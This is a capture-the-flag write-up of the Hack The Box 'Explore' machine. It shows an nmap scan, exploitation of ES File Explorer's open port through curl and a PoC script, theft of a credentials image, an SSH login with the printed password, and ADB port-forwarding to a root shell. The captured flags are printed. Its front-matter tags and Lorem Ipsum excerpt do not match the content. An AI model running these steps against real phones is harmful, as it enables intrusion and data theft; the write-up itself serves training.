---
layout: single
title: Explore - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-07-12
classes: wide
header:
  teaser: /assets/images/htb-writeup-explore/explore_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-explore/explore_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------

   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝


1. [root:~]# nmap -Pn -n -sCV --open 10.10.10.247
    PORT     STATE SERVICE VERSION
    2222/tcp open  ssh     (protocol 2.0)
    | fingerprint-strings:
    |   NULL:
    |_    SSH-2.0-SSH Server - Banana Studio
    | ssh-hostkey:
    |_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port2222-TCP:V=7.91%I=7%D=7/12%Time=60EC0C84%P=x86_64-pc-linux-gnu%r(NU
    SF:LL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");

  [root:~]# nmap -p- --open 10.10.10.247
    PORT      STATE SERVICE
    2222/tcp  open  EtherNetIP-1
    42135/tcp open  unknown
    46285/tcp open  unknown
    59777/tcp open  unknown

  [root:~]# nmap -sU --open 10.10.10.247
    PORT     STATE         SERVICE
    1900/udp open|filtered upnp
    5353/udp open|filtered zeroconf

2. Googling about the unknown ports we quickly discover that 42135 & 59777 = ES File Explorer - which fits the name of the box.

There are numerous vulns out there for ES File Explorer, even a MSF module, however firing them off the shelf gives me response
500 error. After wasting a good amount of time with this error, I found that this is unintended and you should restart the box
until it works.

  [root:/git/htb/explore]# curl --header "Content-Type: application/json" --request POST --data "{"command":getDeviceInfo}" http://10.10.10.247:59777 -vvv
    Note: Unnecessary use of -X or --request, POST is already inferred.
    *   Trying 10.10.10.247:59777...
    * Connected to 10.10.10.247 (10.10.10.247) port 59777 (#0)
    > POST / HTTP/1.1
    > Host: 10.10.10.247:59777
    > User-Agent: curl/7.74.0
    > Accept: */*
    > Content-Type: application/json
    > Content-Length: 23
    >
    * upload completely sent off: 23 out of 23 bytes
    * Mark bundle as not supporting multiuse
    * HTTP 1.0, assume close after body
    < HTTP/1.0 200 OK
    < Content-Type: text/plain
    < Date: Mon, 12 Jul 2021 08:47:41 GMT
    < Content-Length: 73
    <
    * Closing connection 0
    {"name":"VMware Virtual Platform", "ftpRoot":"/sdcard", "ftpPort":"3721"}

The vulnerability now works, to automate the process download a poc script and go at it.

  [root:/git/htb/explore]# python3 rce.py --cmd listPics --ip 10.10.10.247                                                          (master✱)
    [*] Executing command: listPics on 10.10.10.247
    [*] Server responded with: 200

    {"name":"concept.jpg", "time":"4/21/21 02:38:08 AM", "location":"/storage/emulated/0/DCIM/concept.jpg", "size":"135.33 KB (138,573 Bytes)", },
    {"name":"anc.png", "time":"4/21/21 02:37:50 AM", "location":"/storage/emulated/0/DCIM/anc.png", "size":"6.24 KB (6,392 Bytes)", },
    {"name":"creds.jpg", "time":"4/21/21 02:38:18 AM", "location":"/storage/emulated/0/DCIM/creds.jpg", "size":"1.14 MB (1,200,401 Bytes)", },
    {"name":"224_anc.png", "time":"4/21/21 02:37:21 AM", "location":"/storage/emulated/0/DCIM/224_anc.png", "size":"124.88 KB (127,876 Bytes)"}

'creds.jpg' sounds like a great picture, download it.

  [root:/git/htb/explore]# python3 rce.py --get-file /storage/emulated/0/DCIM/creds.jpg --ip 10.10.10.247                           (master✱)
    [*] Getting file: /storage/emulated/0/DCIM/creds.jpg
    	from: 10.10.10.247
    [*] Server responded with: 200
    [*] Writing to file: creds.jpg

CREDS = kristi:Kr1sT!5h@Rp3xPl0r3!


3. Login with SSH and grab user.txt

  [root:~]# ssh kristi@10.10.10.247 -p 2222
    Password authentication
    Password:
    :/ $ id
      uid=10076(u0_a76) gid=10076(u0_a76) groups=10076(u0_a76),3003(inet),9997(everybody),20076(u0_a76_cache),50076(all_a76) context=u:r:untrusted_app:s0:c76,c256,c512,c768
    :/ $ cd sdcard
    :/sdcard $ cat user.txt
      f32017174c7c7e8f50c6da52891ae250


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Looking on running port we find that 5555 is open locally. Reading about Android port 5555 we find that it's used for
   Android Debug Bridge. ADB has an exploit where we can connect to it locally and get a root shell, sounds good!

  :/sdcard $ netstat -antup
    Active Internet connections (established and servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program Name
    ..
    tcp6       0      0 :::5555                 :::*                    LISTEN      -


  [root:~]# ssh -p 2222 -L 5555:localhost:5555 kristi@10.10.10.247
  [root:/opt/scanners/linux]# adb connect localhost:5555
    connected to localhost:5555
  [root:/opt/scanners/linux]# adb devices
    List of devices attached
    emulator-5554	device
    localhost:5555	device
  [root:/opt/scanners/linux]# adb -s localhost:5555 shell
    x86_64:/ $ id
      uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:shell:s0
    x86_64:/ $ exit

  [root:/opt/scanners/linux]# adb root
    restarting adbd as root
  [root:/opt/scanners/linux]# adb -s localhost:5555 shell
    x86_64:/ # id
      uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:su:s0
    x86_64:/ # find -L /data -name "root.txt" 2>/dev/null
      /data/root.txt
    x86_64:/ # cat data/root.txt
      f04fc82b6d49b41c9b08982be59338c5


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

Android Open Ports:
  https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_06B-5_Wu_paper.pdf

ES File Explorer Vuln POC:
  https://github.com/fs0c131y/ESFileExplorerOpenPortVuln

ADB Exploit:
  https://allhacked.com/exploiting-android-through-adb/
  https://stackoverflow.com/questions/14654718/how-to-use-adb-shell-when-multiple-devices-are-connected-fails-with-error-mor
  https://www.remosoftware.com/info/how-to-root-an-android-phone

Find Command in Linux:
  https://www.linode.com/docs/guides/find-files-in-linux-using-the-command-line/
